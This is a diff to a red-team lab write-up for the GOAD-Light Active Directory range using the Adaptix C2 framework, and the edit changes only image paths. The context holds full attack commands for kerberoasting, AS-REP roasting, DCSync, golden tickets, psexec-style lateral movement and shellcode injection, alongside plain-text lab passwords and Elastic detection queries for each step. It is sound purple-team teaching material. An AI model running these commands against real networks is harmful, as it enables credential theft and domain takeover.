@@ -35,7 +35,7 @@ The lab uses GOAD-Light (a multi-domain Active Directory environment with intent
 
 ## Network Topology
 
-![GOAD-Light + Adaptix C2 network topology](writeups/images/red-team-workflow/goadlight-adaptix-topology.svg)
+![GOAD-Light + Adaptix C2 network topology](image/red-team-workflow/goadlight-adaptix-topology.svg)
 
 
 ## 1 - Initial Foothold
@@ -126,9 +126,9 @@ This runs the SAR-BOF `smartscan` module from the castelblack agent. It is a sin
 smartscan 10.1.10.0/24 -p 445
 ```
 
-![](writeups/images/red-team-workflow/20260921161326.png)
+![](image/red-team-workflow/20260921161326.png)
 
-![](writeups/images/red-team-workflow/20260921161345.png)
+![](image/red-team-workflow/20260921161345.png)
 
 
 **OPSEC Comparison:**
@@ -154,11 +154,11 @@ Custom query for high connection volume from a single source:
 event.category:"network" AND destination.port:445 AND source.ip:"10.1.10.22"
 ```
 
-![](writeups/images/red-team-workflow/20260921162237.png)
+![](image/red-team-workflow/20260921162237.png)
 
 The smartscan output is noisy. A quieter alternative: list the ARP table of castelblack to discover neighbors without network scan telemetry.
 
-![](writeups/images/red-team-workflow/20260921162851.png)
+![](image/red-team-workflow/20260921162851.png)
 
 This avoids the detection signals and telemetry that smartscan generates.
 
@@ -185,7 +185,7 @@ ldapsearch (objectClass=user) -a sAMAccountName,description,memberOf,lastLogon
 
 This runs the AD-BOF `ldapsearch` module. It sends an LDAP query from the beacon's current token context. LDAP queries from a domain-joined machine are standard Active Directory traffic.
 
-![](writeups/images/red-team-workflow/20260921164422.png)
+![](image/red-team-workflow/20260921164422.png)
 
 Full syntax reference:
 
@@ -216,7 +216,7 @@ Attempted detection via Sysmon Event ID 3 (network connection). This query looks
 event.code:"3" AND destination.port:389 AND NOT process.name:("lsass.exe" OR "dns.exe" OR "Microsoft.ActiveDirectory.WebServices.exe" OR "svchost.exe" OR "mmc.exe" OR "dsac.exe" OR "ServerManager.exe")
 ```
 
-![](writeups/images/red-team-workflow/20260921163832.png)
+![](image/red-team-workflow/20260921163832.png)
 
 Also attempted filtering by source IP:
 
@@ -224,7 +224,7 @@ Also attempted filtering by source IP:
 event.code:"3" AND destination.port:389 AND source.ip:"10.1.10.22"
 ```
 
-![](writeups/images/red-team-workflow/20260921164001.png)
+![](image/red-team-workflow/20260921164001.png)
 
 **Result: No matches for either query.**
 
@@ -316,7 +316,7 @@ However, if you must use `process create`, spoof the PPID of the child process f
 
 Search the process list for a suitable parent. `svchost` is a good candidate.
 
-![](writeups/images/red-team-workflow/20260921165306.png)
+![](image/red-team-workflow/20260921165306.png)
 
 A process like `msedge` as the parent would raise suspicion. There is no legitimate reason for `msedge` to spawn `cmd.exe`.
 
@@ -326,7 +326,7 @@ config ppid 716
 ```
 
 
-![](writeups/images/red-team-workflow/20260921165526.png)
+![](image/red-team-workflow/20260921165526.png)
 
 Then run `process create` (this returned no output due to a bug in the [Kharon agent](https://github.com/entropy-z/Kharonto), but you can substitute any command that achieves the same result):
 
@@ -339,9 +339,9 @@ process create --command "cmd.exe /c net view \\10.1.10.22 /all" --pipe true
 ```
 dir \\castelblack.north.sevenkingdoms.local\all
 ```
-![](writeups/images/red-team-workflow/20260921171316.png)
+![](image/red-team-workflow/20260921171316.png)
 
-![](writeups/images/red-team-workflow/20260921171509.png)
+![](image/red-team-workflow/20260921171509.png)
 
 `arya.stark` left a note that alludes to a sword named `Needle`. 
 
@@ -368,7 +368,7 @@ KQL Query - For `net view` process creation:
 event.code:"1" AND process.name:"net.exe" AND process.command_line:*view*
 ```
 
-![](writeups/images/red-team-workflow/20260921171757.png)
+![](image/red-team-workflow/20260921171757.png)
 
 Parent process spoofing does not help if the command-line arguments are suspicious. The `netshare` BOF from the Situational Awareness suite would avoid this detection entirely. However, `netshare` was not part of our Adaptix Extension-Kit.
 
@@ -404,7 +404,7 @@ ldapsearch (objectClass=computer) -a sAMAccountName,operatingSystem,dNSHostName,
 ldapsearch (objectClass=group) -a sAMAccountName,member
 ```
 
-![](writeups/images/red-team-workflow/20260922173255.png)
+![](image/red-team-workflow/20260922173255.png)
 
 Full `ldapsearch` syntax:
 
@@ -416,11 +416,11 @@ Interesting finds from output:
 
 jon.snow has Contrained Delegation right to CIFS/winterfell
 
-![](writeups/images/red-team-workflow/20260921173857.png)
+![](image/red-team-workflow/20260921173857.png)
 
 SPN set on sql_svc
 
-![](writeups/images/red-team-workflow/20260921174021.png)
+![](image/red-team-workflow/20260921174021.png)
 
 **OPSEC Comparison:**
 
@@ -469,14 +469,14 @@ impacket-GetNPUsers -dc-ip 10.1.10.11 north.sevenkingdoms.local/samwell.tarly:'H
 ldapsearch "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
 ```
 
-![](writeups/images/red-team-workflow/20260921175805.png)
+![](image/red-team-workflow/20260921175805.png)
 
 ```shell
 # Then asreproast the user
 kerbeus asreproasting /user:brandon.stark /domain:north.sevenkingdoms.local
 ```
 
-![](writeups/images/red-team-workflow/20260921175835.png)
+![](image/red-team-workflow/20260921175835.png)
 
 Full syntax:
 
@@ -503,7 +503,7 @@ Both methods produce the same Event ID 4768 (TGT request) on the DC. The differe
 event.code:"4768" AND winlog.event_data.PreAuthType:"0"
 ```
 
-![](writeups/images/red-team-workflow/20260921180011.png)
+![](image/red-team-workflow/20260921180011.png)
 
 No prebuilt Elastic rule fires on AS-REP roasting in the current 152-rule set. This requires a custom rule.
 
@@ -527,9 +527,9 @@ Step 1 - Enumerate SPN-bearing accounts:
 ldapsearch (servicePrincipalName=*) -a sAMAccountName,servicePrincipalName,pwdLastSet,lastLogon
 ```
 
-![](writeups/images/red-team-workflow/20260921180123.png)
+![](image/red-team-workflow/20260921180123.png)
 
-![](writeups/images/red-team-workflow/20260921180145.png)
+![](image/red-team-workflow/20260921180145.png)
 
 Step 2 - Request a TGT (needed as input to kerberoasting):
 
@@ -537,7 +537,7 @@ Step 2 - Request a TGT (needed as input to kerberoasting):
 kerbeus asktgt /user:samwell.tarly /password:Heartsbane /domain:north.sevenkingdoms.local /enctype:aes256 /opsec
 ```
 
-![](writeups/images/red-team-workflow/20260921180318.png)
+![](image/red-team-workflow/20260921180318.png)
 
 Step 3 - Request TGS for the target SPN using the TGT. Request one SPN at a time (OPSEC: do not spray all SPNs at once):
 
@@ -545,7 +545,7 @@ Step 3 - Request TGS for the target SPN using the TGT. Request one SPN at a time
 kerbeus kerberoasting /spn:CIFS/winterfell.north.sevenkingdoms.local /ticket:<base64_tgt_from_step2>
 ```
 
-![](writeups/images/red-team-workflow/20260921180603.png)
+![](image/red-team-workflow/20260921180603.png)
 
 Full syntax:
 
@@ -575,7 +575,7 @@ hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
 event.code:"4769" AND winlog.event_data.TicketEncryptionType:"0x17" AND NOT winlog.event_data.ServiceName:*$
 ```
 
-![](writeups/images/red-team-workflow/20260921180903.png)
+![](image/red-team-workflow/20260921180903.png)
 
 This detects RC4 TGS requests for user accounts (not machine accounts). No prebuilt Elastic rule covers this. Custom rule required.
 
@@ -641,7 +641,7 @@ Option B - hashdump BOF (recommended, runs as `jeor.mormont`, SAM hive, local ac
 hashdump
 ```
 
-![](writeups/images/red-team-workflow/20260921182208.png)
+![](image/red-team-workflow/20260921182208.png)
 
 Option C running as SYSTEM - lsadump BOFs:
 
@@ -687,7 +687,7 @@ event.code:"10" AND winlog.event_data.TargetImage:*lsass.exe*
 
 Only Option B (recommended) was run. No LSASS access event was generated. This confirms the advantage of the SAM-based approach over touching `lsass.exe`.
 
-![](writeups/images/red-team-workflow/20260921182843.png)
+![](image/red-team-workflow/20260921182843.png)
 
 ---
 
@@ -728,9 +728,9 @@ token impersonate 7979
 kerbeus klist
 ```
 
-![](writeups/images/red-team-workflow/20260921190554.png)
+![](image/red-team-workflow/20260921190554.png)
 
-![](writeups/images/red-team-workflow/20260921190613.png)
+![](image/red-team-workflow/20260921190613.png)
 
 
 The Extension-Kit includes a DCSync BOF under AD-BOF. Use the `dcsync` command:
@@ -743,9 +743,9 @@ dcsync single arya.stark -dc winterfell.north.sevenkingdoms.local
 dcsync single sansa.stark -dc winterfell.north.sevenkingdoms.local
 ```
 
-![](writeups/images/red-team-workflow/20260921190822.png)
+![](image/red-team-workflow/20260921190822.png)
 
-![](writeups/images/red-team-workflow/20260921191656.png)
+![](image/red-team-workflow/20260921191656.png)
 
 For all domain users (very loud, not recommended):
 
@@ -776,7 +776,7 @@ Prebuilt rule:
 rule.name:"Potential Credential Access via DCSync" OR rule.name:"FirstTime Seen Account Performing DCSync"
 ```
 
-![](writeups/images/red-team-workflow/20260921192031.png)
+![](image/red-team-workflow/20260921192031.png)
 
 Despite the targeted single-account DCSync, the `Potential Credential Access via DCSync` rule still fired.
 
@@ -825,7 +825,7 @@ proxychains -q python3 ~/TOOLS/ACTIVEDIR/pyGPOAbuse/pygpoabuse.py \
   -dc-ip 10.1.10.11
 ```
 
-![](writeups/images/red-team-workflow/20260921193926.png)
+![](image/red-team-workflow/20260921193926.png)
 
 Then force GPO update as any user
 
@@ -833,7 +833,7 @@ Then force GPO update as any user
 process create --command "cmd.exe /c gpupdate /force"
 ```
 
-![](writeups/images/red-team-workflow/20260921194400.png)
+![](image/red-team-workflow/20260921194400.png)
 
 The SOCKS proxy routes the LDAP/SMB traffic through the beacon so the DC sees traffic from castelblack (10.1.10.22), not from an external IP.
 
@@ -864,7 +864,7 @@ KQL Query. For the net localgroup command execution on the target:
 event.code:"1" AND process.name:"net.exe" AND process.command_line:*localgroup* AND process.command_line:*administrators*
 ```
 
-![](writeups/images/red-team-workflow/20260921194836.png)
+![](image/red-team-workflow/20260921194836.png)
 
 ---
 
@@ -885,7 +885,7 @@ token revert
 getsystem token
 ```
 
-![](writeups/images/red-team-workflow/20260921192626.png)
+![](image/red-team-workflow/20260921192626.png)
 
 
 This elevates the current agent to SYSTEM and gains TrustedInstaller group privilege through impersonation.
@@ -1017,7 +1017,7 @@ token list
 token impersonate 8529
 ```
 
-![](writeups/images/red-team-workflow/20260922165540.png)
+![](image/red-team-workflow/20260922165540.png)
 
 Create custom service name and binary name to reduce signature:
 
@@ -1025,9 +1025,9 @@ Create custom service name and binary name to reduce signature:
 jump psexec -b svcutil.exe -n "WinConfigSvc" -d "Manages system configuration updates" 10.1.10.11 /local/path/to/smb_x64_svc.exe
 ```
 
-![](writeups/images/red-team-workflow/20260922165526.png)
+![](image/red-team-workflow/20260922165526.png)
 
-![](writeups/images/red-team-workflow/20260922165516.png)
+![](image/red-team-workflow/20260922165516.png)
 
 Full syntax:
 
@@ -1099,7 +1099,7 @@ token list
 token impersonate 8529
 ```
 
-![](writeups/images/red-team-workflow/20260922165540.png)
+![](image/red-team-workflow/20260922165540.png)
 
 With a specific service name and custom binary name:
 
@@ -1107,9 +1107,9 @@ With a specific service name and custom binary name:
 jump scshell 10.1.10.11 /local/path/to/smb_x64_svc.exe -n defragsvc -b update.exe -s C$ -p C:\Windows
 ```
 
-![](writeups/images/red-team-workflow/20260922165815.png)
+![](image/red-team-workflow/20260922165815.png)
 
-![](writeups/images/red-team-workflow/20260922165720.png)
+![](image/red-team-workflow/20260922165720.png)
 
 Full syntax:
 
@@ -1158,7 +1158,7 @@ Service start/stop events:
 event.code:"7036" AND winlog.event_data.param1:("SensorService" OR "defragsvc" OR "SessionEnv" OR "IKEEXT")
 ```
 
-![](writeups/images/red-team-workflow/20260922171135.png)
+![](image/red-team-workflow/20260922171135.png)
 
 ---
 
@@ -1198,7 +1198,7 @@ rule.name:"Potential Remote Desktop Tunneling Detected"
 event.code:"4624" AND winlog.event_data.LogonType:"10"
 ```
 
-![](writeups/images/red-team-workflow/20260922170439.png)
+![](image/red-team-workflow/20260922170439.png)
 
 ---
 
@@ -1222,7 +1222,7 @@ Step 1 - Enumerate delegation:
 ldapsearch (msDS-AllowedToDelegateTo=*) -a sAMAccountName,msDS-AllowedToDelegateTo,userAccountControl
 ```
 
-![](writeups/images/red-team-workflow/20260922143635.png)
+![](image/red-team-workflow/20260922143635.png)
 
 Step 2 - Request TGT for jon.snow:
 
@@ -1230,7 +1230,7 @@ Step 2 - Request TGT for jon.snow:
 kerbeus asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /enctype:aes256 /opsec
 ```
 
-![](writeups/images/red-team-workflow/20260922143744.png)
+![](image/red-team-workflow/20260922143744.png)
 
 Step 3 - Perform S4U attack (S4U2Self + S4U2Proxy) to impersonate Administrator to CIFS on winterfell:
 
@@ -1238,31 +1238,31 @@ Step 3 - Perform S4U attack (S4U2Self + S4U2Proxy) to impersonate Administrator 
 kerbeus s4u /impersonateuser:Administrator /service:CIFS/winterfell.north.sevenkingdoms.local /domain:north.sevenkingdoms.local /ptt /ticket:<base64_tgt_from_step2>
 ```
 
-![](writeups/images/red-team-workflow/20260922143846.png)
+![](image/red-team-workflow/20260922143846.png)
 
 ```
 kerbeus describe /ticket::<base64_tgt_from_step3>
 ```
 
-![](writeups/images/red-team-workflow/20260922144629.png)
+![](image/red-team-workflow/20260922144629.png)
 
 ```
 kerbeus ptt /ticket::<base64_tgt_from_step3>
 ```
 
-![](writeups/images/red-team-workflow/20260922145329.png)
+![](image/red-team-workflow/20260922145329.png)
 
 ```
 kerbeus klist
 ```
 
-![](writeups/images/red-team-workflow/20260922145348.png)
+![](image/red-team-workflow/20260922145348.png)
 
 ```
 dir \\winterfell.north.sevenkingdoms.local\c$
 ```
 
-![](writeups/images/red-team-workflow/20260922145431.png)
+![](image/red-team-workflow/20260922145431.png)
 
 Full syntax:
 
@@ -1301,7 +1301,7 @@ Then query for S4U2Proxy events:
 event.code:"4769" AND winlog.event_data.TransmittedServices:*
 ```
 
-![](writeups/images/red-team-workflow/20260922151221.png)
+![](image/red-team-workflow/20260922151221.png)
 
 ---
 
@@ -1330,7 +1330,7 @@ After moving laterally to winterfell (DC02) and escalating to SYSTEM (see Sectio
 lsadump_secrets
 ```
 
-![](writeups/images/red-team-workflow/20260922153145.png)
+![](image/red-team-workflow/20260922153145.png)
 
 Or if lsadump does not return the krbtgt key, use DCSync for just the krbtgt:
 
@@ -1338,7 +1338,7 @@ Or if lsadump does not return the krbtgt key, use DCSync for just the krbtgt:
 dcsync single krbtgt -dc winterfell.north.sevenkingdoms.local
 ```
 
-![](writeups/images/red-team-workflow/20260922153207.png)
+![](image/red-team-workflow/20260922153207.png)
 
 Step 2 - Create a Golden Ticket with ExtraSids. The Kerbeus-BOF does not have a `golden` subcommand. Use `execute-assembly` with Rubeus:
 
@@ -1346,9 +1346,9 @@ Step 2 - Create a Golden Ticket with ExtraSids. The Kerbeus-BOF does not have a 
 execute-assembly /path/to/Rubeus.exe golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-3070733070-37185155-1944012974 /aes256:<krbtgt_aes256_from_step1> /sids:S-1-5-21-4129000305-2956170768-4065605194-519 /ptt /nowrap /simple
 ```
 
-![](writeups/images/red-team-workflow/20260922155657.png)
+![](image/red-team-workflow/20260922155657.png)
 
-![](writeups/images/red-team-workflow/20260922155708.png)
+![](image/red-team-workflow/20260922155708.png)
 
 Or forge the ticket offline via SOCKS and inject it:
 
@@ -1379,7 +1379,7 @@ Back in the [Kharon agent](https://github.com/entropy-z/Kharonto):
 kerbeus ptt /ticket:<base64_kirbi>
 ```
 
-![](writeups/images/red-team-workflow/20260922155741.png)
+![](image/red-team-workflow/20260922155741.png)
 
 Step 3a - Move to DC01 (kingslanding) via manual upload and invoke scshell:
 
@@ -1387,21 +1387,21 @@ Step 3a - Move to DC01 (kingslanding) via manual upload and invoke scshell:
 dir \\kingslanding.sevenkingdoms.local\ADMIN$
 ```
 
-![](writeups/images/red-team-workflow/20260922155811.png)
+![](image/red-team-workflow/20260922155811.png)
 
 ```
 upload /local/path/to/http_x64.exe \\kingslanding.sevenkingdoms.local\ADMIN$\http_x64.exe
 ```
 
-![](writeups/images/red-team-workflow/20260922160121.png)
+![](image/red-team-workflow/20260922160121.png)
 
 ```
 invoke scshell kingslanding.sevenkingdoms.local defragsvc "C:\Windows\http_x64.exe"
 ```
 
-![](writeups/images/red-team-workflow/20260922160132.png)
+![](image/red-team-workflow/20260922160132.png)
 
-![](writeups/images/red-team-workflow/20260922160214.png)
+![](image/red-team-workflow/20260922160214.png)
 
 Step 3b - Alternative: Move to DC01 via jump scshell BOF (single command, avoids Event ID 7045):
 
@@ -1409,9 +1409,9 @@ Step 3b - Alternative: Move to DC01 via jump scshell BOF (single command, avoids
 jump scshell kingslanding.sevenkingdoms.local /path/to/http_x64.exe -n defragsvc
 ```
 
-![](writeups/images/red-team-workflow/20260922160516.png)
+![](image/red-team-workflow/20260922160516.png)
 
-![](writeups/images/red-team-workflow/20260922160527.png)
+![](image/red-team-workflow/20260922160527.png)
 
 **OPSEC Warning:** Golden Ticket usage generates Event 4769 with potentially anomalous ticket lifetimes. ExtraSids specifically triggers SID filtering checks if inter-forest (but not intra-forest child-to-parent).
 
@@ -1435,7 +1435,7 @@ For Kerberos anomalies:
 event.code:"4769" AND winlog.event_data.ServiceName:"krbtgt"
 ```
 
-![](writeups/images/red-team-workflow/20260922162130.png)
+![](image/red-team-workflow/20260922162130.png)
 
 ---
 
@@ -1459,7 +1459,7 @@ fs ls \\10.1.10.22\all
 fs cat \\10.1.10.22\all\arya.txt
 ```
 
-![](writeups/images/red-team-workflow/20260922160926.png)
+![](image/red-team-workflow/20260922160926.png)
 
 Or download to the C2 server:
 
@@ -1535,31 +1535,31 @@ whoami
 ipconfig
 ```
 
-![](writeups/images/red-team-workflow/20260922161422.png)
+![](image/red-team-workflow/20260922161422.png)
 
 ```
 arp
 ```
 
-![](writeups/images/red-team-workflow/20260922161334.png)
+![](image/red-team-workflow/20260922161334.png)
 
 ```
 env
 ```
 
-![](writeups/images/red-team-workflow/20260922161228.png)
+![](image/red-team-workflow/20260922161228.png)
 
 ```
 routeprint
 ```
 
-![](writeups/images/red-team-workflow/20260922161251.png)
+![](image/red-team-workflow/20260922161251.png)
 
 ```
 uptime
 ```
 
-![](writeups/images/red-team-workflow/20260922161356.png)
+![](image/red-team-workflow/20260922161356.png)
 
 All of these are SAL-BOF modules. They run as BOFs in the beacon process memory. They do not spawn child processes.
 
@@ -1607,9 +1607,9 @@ scinject <target_pid> /path/to/shellcode.bin
 ```
 
 
-![](writeups/images/red-team-workflow/20260922163810.png)
+![](image/red-team-workflow/20260922163810.png)
 
-![](writeups/images/red-team-workflow/20260922163754.png)
+![](image/red-team-workflow/20260922163754.png)
 
 Or via postex fork with explicit injection into an existing process:
 
@@ -1643,7 +1643,7 @@ Sysmon Event 8 (CreateRemoteThread):
 event.code:"8" AND NOT winlog.event_data.SourceImage:(*csrss.exe* OR *wininit.exe* OR *winlogon.exe* OR *services.exe* OR *lsass.exe* OR *svchost.exe*)
 ```
 
-![](writeups/images/red-team-workflow/20260922163943.png)
+![](image/red-team-workflow/20260922163943.png)
 
 
 ---
@@ -1660,9 +1660,9 @@ The Injection-BOF module provides four alternative injection methods.
 inject-sec <pid> <shellcode_file>
 ```
 
-![](writeups/images/red-team-workflow/20260922163302.png)
+![](image/red-team-workflow/20260922163302.png)
 
-![](writeups/images/red-team-workflow/20260922161820.png)
+![](image/red-team-workflow/20260922161820.png)
 
 Uses NtCreateSection + NtMapViewOfSection instead of VirtualAllocEx and WriteProcessMemory. The memory allocation and write calls are different from CreateRemoteThread injection. However, a remote thread is still created to execute the mapped section.
 
@@ -1678,7 +1678,7 @@ Sysmon Event 8 (CreateRemoteThread):
 event.code:"8" AND NOT winlog.event_data.SourceImage:(*csrss.exe* OR *wininit.exe* OR *winlogon.exe* OR *services.exe* OR *lsass.exe* OR *svchost.exe*)
 ```
 
-![](writeups/images/red-team-workflow/20260922162950.png)
+![](image/red-team-workflow/20260922162950.png)
 
 Any remote process injection that creates a thread in another process can trigger Sysmon Event ID 8 (CreateRemoteThread). Even if Adaptix uses indirect syscalls to call `NtCreateThreadEx`, Sysmon hooks the kernel callback for remote thread creation. The event is still logged regardless of the user-mode call path.
 
